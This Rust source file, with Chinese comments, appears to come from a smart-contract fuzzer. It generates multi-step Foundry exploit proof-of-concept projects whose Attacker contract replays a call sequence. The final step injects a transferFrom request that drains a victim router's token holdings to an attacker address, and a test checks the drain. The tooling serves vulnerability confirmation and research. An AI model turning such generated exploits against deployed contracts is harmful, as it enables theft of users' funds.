//! L3 多步攻击 PoC 机械合成（issue #36）：witness = 调用序列（#35）
//! → DeFiHackLabs 式**攻击合约 + 序列驱动**的 Foundry 工程。
//!
//! # 合成形态（零个案，全部机械渲染自 poc.json）
//!
//! - **`src/Attacker.sol`**：攻击合约——构造器收 victim 地址 +
//!   受害资产 mock 地址 + 在场合约表（poc.json deployments，#34）；
//!   `attack()` 按 `Poc.steps` 依次 `target.call{value: v}(data)`，
//!   每步 require(ok)（L1 逐步诚实：失败步如实 revert）。
//! - **逐步独立头形解析**：每步 calldata 经 [`parse_head_shape`]
//!   解析后由 `abi.encodeWithSelector` 重新编码（不退化为硬编码
//!   裸字节串）——**payload 步**（末步，与 L2 同锚）走 L2 的全套
//!   注入（目标槽经定罪呼出目标交叉定位 = 受害资产；动态头形的
//!   尾偏移槽 = `abi.encodeCall(IERC20.transferFrom, …)` 请求；
//!   定长头零词按 debit/recipient/amount 角色序注入；臂 3 洁净性
//!   /零词注入点等 eligibility 与 L2 逐条一致，不满足即 BadShape
//!   诚实降级）；**布置步**（其余步）头形原样重编码（全词逐字
//!   保留，动态尾 verbatim 追加）。
//! - **`test/PoC.t.sol`**：布置（受害资产 mint 给 ROUTER + 目标
//!   字节码 etch + prestate store + 在场合约表 etch + allowance
//!   前提槽 + registry 成员槽）→ 部署 Attacker → `attack()` →
//!   终点断言（每个受害资产的 ROUTER 持仓严格归零——与 L2 同锚）。
//!
//! # 诚实降级（fail-closed 原则不变）
//!
//! 任一步头形解析失败 / payload 步 eligibility 不满足（目标槽
//! 不可定位、多解、臂 3 过滤、零词注入点不足）→ [`PocgenError`]
//! 如实报错，不硬套个案；多步非 arbitrary_call 族在 dispatch
//! 层已降级（synth.rs）。

use std::fmt::Write as _;
use std::path::Path;

use alloy_primitives::U256;
use loom_fuzz_oracle::{hex_bytes, hex_u256, Poc, PocStep};

use crate::synth::{
    addr_expr, deploy_addr, head_arg_exprs, head_words_of, ierc20_sol, mock_erc20_sol,
    parse_head_shape, render_deploy_etches, render_prestate_stores, u256_hex64, vm_sol,
    ExploitParams, HeadShape, PocgenError, ProjectArtifacts, VictimModel, VM_ADDRESS,
};
use crate::synth::{foundry_toml, run_sh, underlying_selector};

/// 单步的渲染产物：目标地址表达式、value 字面量、data 表达式、
/// 前置声明（request 等）。
struct StepRender {
    target: String,
    value: String,
    decls: String,
    data_expr: String,
}

/// payload 步（末步）的 L2 同锚分析结果：注入点 + 受害资产模型。
struct PayloadPlan {
    target_slot: usize,
    tail_slot: Option<usize>,
    model: VictimModel,
}

/// 入口：多步 confirmed poc → L3 工程 + forge test。绿灯返回
/// (工程路径, forge 输出摘要)。
#[allow(clippy::too_many_arguments)] // 参数面 = poc.json 注入上下文的完整传递
pub(crate) fn generate_l3(
    poc: &Poc,
    steps: &[PocStep],
    code_hex: &str,
    out_dir: &Path,
    fork: bool,
    prestate: &[(U256, U256)],
    contract: [u8; 20],
    params: &ExploitParams,
) -> Result<(std::path::PathBuf, String), PocgenError> {
    let call = poc.call.as_ref().ok_or_else(|| {
        PocgenError::BadShape("旧 poc 无定罪呼出（#20 前格式）——目标槽不可机械定位".to_string())
    })?;
    let evidence_target = hex_bytes(&call.target).map_err(PocgenError::BadPoc)?;
    if evidence_target.len() != 20 {
        return Err(PocgenError::BadPoc(
            "poc.call.target 非 20 字节".to_string(),
        ));
    }
    let evidence_input = hex_bytes(&call.input).map_err(PocgenError::BadPoc)?;
    let mut target_word = [0u8; 32];
    target_word[12..].copy_from_slice(&evidence_target);
    let evidence_target_word = U256::from_be_bytes(target_word);

    // 逐步独立头形解析 + 表达式渲染（布置步 verbatim；末步 L2 注入）。
    let last = steps.len() - 1;
    let mut model = VictimModel::Single;
    let mut renders = Vec::with_capacity(steps.len());
    let mut total_value = U256::ZERO;
    for (i, step) in steps.iter().enumerate() {
        let calldata = hex_bytes(&step.calldata).map_err(PocgenError::BadPoc)?;
        let target = hex_bytes(&step.target).map_err(PocgenError::BadPoc)?;
        if target.len() != 20 {
            return Err(PocgenError::BadPoc(format!(
                "poc.steps[{i}].target 非 20 字节"
            )));
        }
        let mut target_arr = [0u8; 20];
        target_arr.copy_from_slice(&target);
        let value = hex_u256(&step.value).map_err(PocgenError::BadPoc)?;
        total_value += value;
        let shape = parse_head_shape(&calldata)
            .map_err(|e| PocgenError::BadShape(format!("步 {i} 头形解析失败: {e}")))?;
        if i == last {
            let plan = analyze_payload(&shape, evidence_target_word, &evidence_input, &calldata)?;
            model = plan.model;
            renders.push(render_payload_step(&shape, &plan, target_arr, value));
        } else {
            renders.push(render_setup_step(i, &shape, &calldata, target_arr, value)?);
        }
    }

    let artifacts = ProjectArtifacts {
        files: vec![
            ("src/MockERC20.sol".into(), mock_erc20_sol()),
            ("src/IERC20.sol".into(), ierc20_sol()),
            ("src/Vm.sol".into(), vm_sol()),
            (
                "src/Attacker.sol".into(),
                attacker_sol(&renders, params, &poc.deployments),
            ),
            (
                "test/PoC.t.sol".into(),
                l3_test_sol(
                    prestate,
                    code_hex,
                    params,
                    &poc.deployments,
                    contract,
                    model,
                    total_value,
                ),
            ),
            ("foundry.toml".into(), foundry_toml(fork)),
            ("README.md".into(), readme_l3(fork)),
        ]
        .into_iter()
        .chain(fork.then(|| ("run.sh".into(), run_sh())))
        .collect(),
    };
    artifacts.write(out_dir).map_err(PocgenError::Io)?;
    let summary = crate::project::forge_test(out_dir, fork, poc.fork.as_ref())?;
    Ok((out_dir.to_path_buf(), summary))
}

/// payload 步的 L2 同锚 eligibility（与 synth.rs 单步路径逐条一致）：
/// 目标槽经定罪呼出目标交叉定位（唯一匹配）；动态头解释需臂 3 转发
/// 证据（定罪呼出 input 是 payload calldata 的子串），否则回退定长头；
/// 动态头的臂 3 洁净性过滤；定长头的零词注入点 ≥ 3（角色序放置）。
fn analyze_payload(
    shape: &HeadShape,
    evidence_target_word: U256,
    evidence_input: &[u8],
    calldata: &[u8],
) -> Result<PayloadPlan, PocgenError> {
    let mut tail_slot = shape.tail_slot;
    if tail_slot.is_some() {
        // 臂 3 转发证据（issue #28 同语义）：定罪呼出 input 是 payload
        // calldata 的字节子串（memmem 级）。
        let forwarded = !evidence_input.is_empty()
            && evidence_input.len() <= calldata.len()
            && calldata
                .windows(evidence_input.len())
                .any(|w| w == evidence_input);
        if !forwarded {
            tail_slot = None;
        }
    }
    let head_words = head_words_of(shape);
    let target_hits: Vec<usize> = head_words
        .iter()
        .enumerate()
        .filter(|(_, w)| **w == evidence_target_word)
        .map(|(i, _)| i)
        .collect();
    let target_slot = match target_hits.len() {
        1 => target_hits[0],
        0 => {
            return Err(PocgenError::BadShape(
                "无头词匹配定罪呼出目标——目标槽不可机械定位".to_string(),
            ))
        }
        _ => {
            return Err(PocgenError::BadShape(format!(
                "多个头词匹配定罪呼出目标（歧义）：槽 {target_hits:?}"
            )))
        }
    };
    if tail_slot.is_some() && !shape.arm3_eligible {
        return Err(PocgenError::BadShape(
            "臂 3 过滤：槽 0 非地址洁净（动态头候选被过滤）".to_string(),
        ));
    }
    if tail_slot.is_none() {
        let zero_slots = head_words
            .iter()
            .enumerate()
            .filter(|(i, w)| **w == U256::ZERO && *i != target_slot)
            .count();
        if zero_slots < 3 {
            return Err(PocgenError::BadShape(format!(
                "定长头零词注入点不足（{zero_slots} < 3），debit/recipient/amount 角色无法机械放置"
            )));
        }
    }
    let model = match evidence_input.first_chunk::<4>() {
        Some(sel) if u32::from_be_bytes(*sel) == underlying_selector() => VictimModel::Pegged,
        _ => VictimModel::Single,
    };
    Ok(PayloadPlan {
        target_slot,
        tail_slot,
        model,
    })
}

/// 布置步渲染：头形原样重编码（全词逐字 `uint256(0x…)`，动态尾
/// verbatim 追加）——布置语义（存储布置/授权等）由 witness 步
/// calldata 原样承载，不做价值注入。
fn render_setup_step(
    i: usize,
    shape: &HeadShape,
    calldata: &[u8],
    target: [u8; 20],
    value: U256,
) -> Result<StepRender, PocgenError> {
    let head_words = head_words_of(shape);
    let args: Vec<String> = head_words
        .iter()
        .map(|w| format!("uint256(0x{})", u256_hex64(*w)))
        .collect();
    let prefix = format!(
        "abi.encodeWithSelector({:#06x}, {})",
        shape.selector,
        args.join(", ")
    );
    let data_expr = if shape.tail_slot.is_some() {
        // 尾区 = calldata 头后的原始字节（长度字 + 内容），verbatim。
        let head_bytes = 4 + head_words.len() * 32;
        if calldata.len() < head_bytes {
            return Err(PocgenError::BadShape(format!(
                "步 {i} calldata 短于头宽（{} < {head_bytes}）",
                calldata.len()
            )));
        }
        let tail_hex: String = calldata[head_bytes..].iter().fold(
            String::with_capacity((calldata.len() - head_bytes) * 2),
            |mut s, b| {
                let _ = write!(s, "{b:02x}");
                s
            },
        );
        format!("abi.encodePacked({prefix}, hex\"{tail_hex}\")")
    } else {
        prefix
    };
    Ok(StepRender {
        target: addr_expr(target),
        value: value.to_string(),
        decls: String::new(),
        data_expr,
    })
}

/// payload 步渲染：L2 同锚注入（目标槽 = 受害资产；尾偏移槽 =
/// transferFrom 请求；零词角色序）。
fn render_payload_step(
    shape: &HeadShape,
    plan: &PayloadPlan,
    target: [u8; 20],
    value: U256,
) -> StepRender {
    let head_words = head_words_of(shape);
    // Attacker.sol 上下文：受害资产 = asset immutable，debit 角色 = router。
    let arg_exprs = head_arg_exprs(
        head_words,
        plan.target_slot,
        plan.tail_slot,
        "address(asset)",
        "router",
    );
    let data_expr = format!(
        "abi.encodeWithSelector({:#06x}, {})",
        shape.selector,
        arg_exprs.join(", ")
    );
    let decls = if plan.tail_slot.is_some() {
        "        bytes memory request =\n            abi.encodeCall(IERC20.transferFrom, (router, ATTACKER, BALANCE));\n"
            .to_string()
    } else {
        String::new()
    };
    StepRender {
        target: addr_expr(target),
        value: value.to_string(),
        decls,
        data_expr,
    }
}

/// Attacker.sol（机械模板）：构造器收 victim + 受害资产 + 在场合约
/// 表；attack() 按 witness 序列逐步 `target.call{value}(data)`。
fn attacker_sol(
    renders: &[StepRender],
    params: &ExploitParams,
    deployments: &[loom_fuzz_oracle::PocDeployment],
) -> String {
    let attacker = format!(
        "address(uint160(0x{}))",
        u256_hex64(U256::from_be_bytes({
            let mut w = [0u8; 32];
            w[12..].copy_from_slice(&params.attacker);
            w
        }))
        .trim_start_matches('0')
    );
    // 在场合约表 immutable 字段 + 构造参数（机械逐字段）。
    let mut fields = String::new();
    let mut ctor_params = String::from("address _router, address _asset");
    let mut ctor_body = String::from("        router = _router;\n        asset = _asset;\n");
    for (i, _d) in deployments.iter().enumerate() {
        let _ = writeln!(fields, "    address private immutable field{i};");
        let _ = write!(ctor_params, ", address _field{i}");
        let _ = writeln!(ctor_body, "        field{i} = _field{i};");
    }
    let mut attack_body = String::new();
    for (i, r) in renders.iter().enumerate() {
        let tag = if i == renders.len() - 1 {
            "payload（L2 同锚注入）"
        } else {
            "setup（witness 原样重编码）"
        };
        let _ = writeln!(attack_body, "        // 步 {i}（{tag}）。");
        attack_body.push_str(&r.decls);
        let _ = writeln!(
            attack_body,
            "        bytes memory data{i} = {};",
            r.data_expr
        );
        let _ = writeln!(
            attack_body,
            "        (bool ok{i}, ) = {}.call{{value: {}}}(data{i});",
            r.target, r.value
        );
        let _ = writeln!(
            attack_body,
            "        require(ok{i}, \"L3 step {i} failed\");"
        );
    }
    format!(
        r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {{IERC20}} from "./IERC20.sol";

/// L3 攻击合约（loom-fuzz-pocgen 机械合成，勿手改——重生成覆盖）。
/// witness = 调用序列（poc.json steps，issue #35）：attack() 按序
/// 逐步 target.call{{value: v}}(data)——data 由各步 witness calldata
/// 头形解析后经 abi 编码重新表达（非硬编码裸字节串；payload 步的
/// 槽替换 = L2 同锚的价值注入）。构造器收 victim 地址 + 受害资产
/// mock + 在场合约表（poc.json deployments，issue #34）。
contract Attacker {{
    address private immutable router; // victim（分析合约）
    address private immutable asset; // 受害资产 mock（L2 同锚注入对象）
{fields}
    address private constant ATTACKER = {attacker};
    uint256 private constant BALANCE = {balance};

    constructor({ctor_params}) {{
{ctor_body}    }}

    function attack() external {{
{attack_body}    }}
}}
"#,
        balance = params.balance,
    )
}

/// L3 测试体（机械合成）：布置（L2 同锚资产模型 + 目标/在场合约表
/// etch + prestate/前提槽）→ 部署 Attacker → attack() → 终点断言
///（每个受害资产的 ROUTER 持仓严格归零）。
#[allow(clippy::too_many_arguments)]
fn l3_test_sol(
    prestate: &[(U256, U256)],
    code_hex: &str,
    params: &ExploitParams,
    deployments: &[loom_fuzz_oracle::PocDeployment],
    contract: [u8; 20],
    model: VictimModel,
    total_value: U256,
) -> String {
    let router = addr_expr(contract);
    let attacker = format!(
        "address(uint160(0x{}))",
        u256_hex64(U256::from_be_bytes({
            let mut w = [0u8; 32];
            w[12..].copy_from_slice(&params.attacker);
            w
        }))
        .trim_start_matches('0')
    );
    let (victim_setup, victim_asserts) = match model {
        VictimModel::Single => (
            "        MockERC20 token = new MockERC20(address(0));\n        token.mint(ROUTER, BALANCE);\n".to_string(),
            "        require(\n            token.balanceOf(ROUTER) == 0,\n            string.concat(\"L3: token holding not drained: \", _toString(token.balanceOf(ROUTER)))\n        );\n".to_string(),
        ),
        VictimModel::Pegged => (
            "        MockERC20 underlyingAsset = new MockERC20(address(0));\n        MockERC20 token = new MockERC20(address(underlyingAsset));\n        token.mint(ROUTER, BALANCE);\n        underlyingAsset.mint(ROUTER, BALANCE);\n".to_string(),
            "        require(\n            token.balanceOf(ROUTER) == 0,\n            string.concat(\"L3: token holding not drained: \", _toString(token.balanceOf(ROUTER)))\n        );\n        require(\n            underlyingAsset.balanceOf(ROUTER) == 0,\n            string.concat(\"L3: underlying holding not drained: \", _toString(underlyingAsset.balanceOf(ROUTER)))\n        );\n".to_string(),
        ),
    };
    let mut allowance_stores = String::new();
    allowance_stores.push_str(
        "        vm.store(\n            address(token),\n            keccak256(abi.encode(ROUTER, keccak256(abi.encode(ROUTER, uint256(1))))),\n            bytes32(BALANCE)\n        );\n",
    );
    if model == VictimModel::Pegged {
        allowance_stores.push_str(
            "        vm.store(\n            address(underlyingAsset),\n            keccak256(abi.encode(ROUTER, keccak256(abi.encode(ROUTER, uint256(1))))),\n            bytes32(BALANCE)\n        );\n",
        );
    }
    let mut stores = render_prestate_stores(prestate);
    stores
        .push_str("        // VICTIM_ASSET 作为 service 的 registry 成员布置（价值影响前提）。\n");
    stores.push_str(
        "        vm.store(ROUTER, keccak256(abi.encode(address(token), uint256(0))), bytes32(uint256(1)));\n",
    );
    stores.push_str(&render_deploy_etches(deployments));

    // 在场合约表地址 = 构造实参（机械逐个）。
    let mut ctor_args = String::from("ROUTER, address(token)");
    for d in deployments {
        let _ = write!(ctor_args, ", {}", addr_expr(deploy_addr(d)));
    }
    let deal_line = if total_value > U256::ZERO {
        format!("        vm.deal(address(attacker), {});\n", total_value)
    } else {
        String::new()
    };

    format!(
        r#"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {{MockERC20}} from "../src/MockERC20.sol";
import {{Attacker}} from "../src/Attacker.sol";
import {{Vm}} from "../src/Vm.sol";

/// L3 exploit PoC（loom-fuzz-pocgen 机械合成，勿手改——重生成覆盖）。
///
/// witness = 调用序列（poc.json steps）：布置（L2 同锚资产模型 +
/// 目标/在场合约表 etch + prestate/前提槽）→ 部署攻击合约（构造器
/// 收 victim + 受害资产 + 在场合约表）→ attacker.attack() 按序重放
/// → 终点断言 = 每个受害资产的 ROUTER 持仓严格归零（与 L2 同锚）。
contract PoC {{
    Vm constant vm = Vm({VM_ADDRESS});
    address constant ROUTER = {router};
    address constant ATTACKER = {attacker};
    uint256 constant BALANCE = {balance};

    function testExploit() public {{
        // 资产模型（L2 同锚）：受害资产全额 mint 给 ROUTER。
{victim_setup}
        // 目标合约：poc.json 的运行时字节码 + prestate/在场合约表布置。
        vm.etch(ROUTER, hex"{code_hex}");
{stores}{allowance_stores}
        // 攻击合约：构造器收 victim 地址 + 受害资产 + 在场合约表。
        Attacker attacker = new Attacker({ctor_args});
{deal_line}        attacker.attack();

        // 终点断言（L2 同锚）：每个受害资产的 ROUTER 持仓严格归零。
{victim_asserts}    }}

    function _toString(uint256 v) internal pure returns (string memory) {{
        if (v == 0) return "0";
        bytes memory buf = new bytes(78);
        uint256 i = buf.length;
        while (v > 0) {{
            i--;
            buf[i] = bytes1(uint8(48 + (v % 10)));
            v /= 10;
        }}
        bytes memory out = new bytes(buf.length - i);
        for (uint256 j = 0; j < out.length; j++) {{
            out[j] = buf[i + j];
        }}
        return string(out);
    }}
}}
"#,
        balance = params.balance,
    )
}

/// L3 工程 README。
fn readme_l3(fork: bool) -> String {
    let mut s = String::new();
    s.push_str(
        r#"# loom-fuzz exploit PoC（L3 多步攻击层，issue #36）

机械合成自 confirmed 的多步 poc.json（loom-fuzz-pocgen）——**forge
test 绿灯 = 终判**。witness = 调用序列：攻击合约（`src/Attacker.sol`）
的 `attack()` 按 `Poc.steps` 依次 `target.call{value}(calldata)`——
calldata 由各步 witness 头形解析后经 abi 编码重新表达（payload 末步
的槽替换 = L2 同锚价值注入：目标槽 = 受害资产、动态尾 = transferFrom
请求、零词角色序）。**无法机械合成时 pocgen 如实降级（BadShape /
NoGenericAction），不硬套个案。**

```sh
forge test          # 字节码模式（默认，离线）
```

## 结构

- `src/Attacker.sol`：机械合成的攻击合约（构造器收 victim + 受害
  资产 + 在场合约表；attack() 序列驱动）。
- `src/MockERC20.sol`：受害资产（槽布局钉死：balanceOf = slot 0、
  allowance = slot 1——vm.store 机械公式的依据）。
- `test/PoC.t.sol`：布置（etch + prestate + 前提槽）→ 部署 Attacker
  → attack() → 终点断言（每个受害资产的 ROUTER 持仓归零）。

"#,
    );
    if fork {
        s.push_str(
            r#"## fork 模式（BlockMachine）

```sh
export BLOCKMACHINE_RPC_URL=...
export BLOCKMACHINE_API_KEY=...    # 空 = 直接无 key 连接（免费档）
./run.sh
```
"#,
        );
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::synth::ROUTER_ADDRESS;
    use loom_fuzz_oracle::{PocCall, POC_FORMAT};

    fn word64(v: u64) -> String {
        u256_hex64(U256::from(v))
    }

    /// 多步 TRV-forward fixture poc（与 tests/l3_sequence.rs 同形）：
    /// 步0 布置（SET 分支），步1 触发 + 裸转发尾（GO 分支）。
    fn two_step_poc() -> (Poc, Vec<u8>) {
        let magic = 0xc0deu64;
        let set_magic = 0x51u64;
        let go_magic = 0x67u64;
        let sink = "0x1111111111111111111111111111111111111111";
        // 步0（布置）：SET 分支——SSTORE(0, MAGIC)。
        let mut step0 = 0xdeadbeefu32.to_be_bytes().to_vec();
        step0.extend_from_slice(&U256::from(set_magic).to_be_bytes::<32>());
        step0.extend_from_slice(&U256::from(magic).to_be_bytes::<32>());
        // 步1（payload）：GO 分支（word0）→ 守卫 → 目标帧转发：
        // to = word1（sink），input = 动态尾内容（len + "loom"）。
        let mut step1 = 0xdeadbeefu32.to_be_bytes().to_vec();
        step1.extend_from_slice(&U256::from(go_magic).to_be_bytes::<32>());
        let mut sink_word = [0u8; 32];
        sink_word[12..].copy_from_slice(&hex_bytes(sink).unwrap());
        step1.extend_from_slice(&sink_word);
        // 标准 ABI：bytes 槽在词 2，偏移值 = 0x60（指头宽后）。
        step1.extend_from_slice(&U256::from(0x60u64).to_be_bytes::<32>());
        step1.extend_from_slice(&U256::from(4u64).to_be_bytes::<32>());
        step1.extend_from_slice(b"loom");
        step1.extend_from_slice(&[0u8; 28]);
        let call_input = {
            // 定罪呼出 input = 目标帧实际转发出去的字节（尾内容 "loom"）。
            b"loom".to_vec()
        };
        let poc = Poc {
            format: POC_FORMAT.to_string(),
            digest: "0x00".into(),
            selector: "0xdeadbeef".into(),
            step: 0,
            pc: 0,
            verdict: "confirmed".into(),
            steps: vec![
                loom_fuzz_oracle::PocStep {
                    target: "0x2222222222222222222222222222222222222222".into(),
                    caller: "0x3333333333333333333333333333333333333333".into(),
                    value: word64(0),
                    calldata: format!("0x{}", hex_str(&step0)),
                },
                loom_fuzz_oracle::PocStep {
                    target: "0x2222222222222222222222222222222222222222".into(),
                    caller: "0x3333333333333333333333333333333333333333".into(),
                    value: word64(0),
                    calldata: format!("0x{}", hex_str(&step1)),
                },
            ],
            tx: None,
            prestate: Default::default(),
            responses: vec![],
            seed: 42,
            max_runs: 100,
            time_budget_secs: 300,
            evidence_value: None,
            fork: None,
            deployments: vec![loom_fuzz_oracle::PocDeployment {
                address: "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".into(),
                runtime_hex: "0x600160005260206000f3".into(),
            }],
            entry: None,
            contract: Some("0x2222222222222222222222222222222222222222".into()),
            family: loom_fuzz_oracle::HitFamily::ArbitraryCall,
            call: Some(PocCall {
                target: sink.into(),
                input: format!("0x{}", hex_str(&call_input)),
            }),
            replay: String::new(),
        };
        (poc, step1)
    }

    fn hex_str(b: &[u8]) -> String {
        b.iter()
            .fold(String::with_capacity(b.len() * 2), |mut s, x| {
                let _ = write!(s, "{x:02x}");
                s
            })
    }

    #[test]
    fn l3_renders_attacker_and_per_step_parsing() {
        let (poc, _step1) = two_step_poc();
        let steps = poc.normalized_steps().unwrap();
        let out = std::env::temp_dir().join(format!("loom-l3-render-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&out);
        // 渲染层验证（不跑 forge——forge 绿灯见 tests/l3_sequence.rs）。
        let call = poc.call.as_ref().unwrap();
        let evidence_target = hex_bytes(&call.target).unwrap();
        let mut tw = [0u8; 32];
        tw[12..].copy_from_slice(&evidence_target);
        let etw = U256::from_be_bytes(tw);
        let evidence_input = hex_bytes(&call.input).unwrap();
        let last = steps.len() - 1;
        for (i, s) in steps.iter().enumerate() {
            let calldata = hex_bytes(&s.calldata).unwrap();
            let shape = parse_head_shape(&calldata).unwrap();
            if i == last {
                let plan = analyze_payload(&shape, etw, &evidence_input, &calldata).unwrap();
                let r = render_payload_step(&shape, &plan, [0x22; 20], U256::ZERO);
                assert!(r.data_expr.contains("address(asset)"));
                assert!(r.data_expr.contains("request"));
                assert!(r.decls.contains("transferFrom"));
            } else {
                let r = render_setup_step(i, &shape, &calldata, [0x22; 20], U256::ZERO).unwrap();
                assert!(r.data_expr.contains("abi.encodeWithSelector(0xdeadbeef"));
                assert!(r.data_expr.contains("uint256(0x"));
                assert!(!r.data_expr.contains("address(token)"), "布置步无注入");
            }
        }
        let _ = out;
    }

    #[test]
    fn l3_payload_bad_shape_degrades_honestly() {
        // 头形与定罪目标无交叉（payload 头词无 sink）→ BadShape。
        let (poc, _) = two_step_poc();
        let mut bad = poc;
        bad.call = Some(PocCall {
            target: "0x9999999999999999999999999999999999999999".into(),
            input: bad.call.as_ref().unwrap().input.clone(),
        });
        let steps = bad.normalized_steps().unwrap();
        let err = generate_l3(
            &bad,
            &steps,
            "6000",
            std::path::Path::new("/tmp/loom-l3-unused"),
            false,
            &[],
            ROUTER_ADDRESS,
            &ExploitParams::default(),
        )
        .unwrap_err();
        assert!(
            matches!(err, PocgenError::BadShape(_)),
            "应 BadShape 诚实降级: {err}"
        );
    }
}
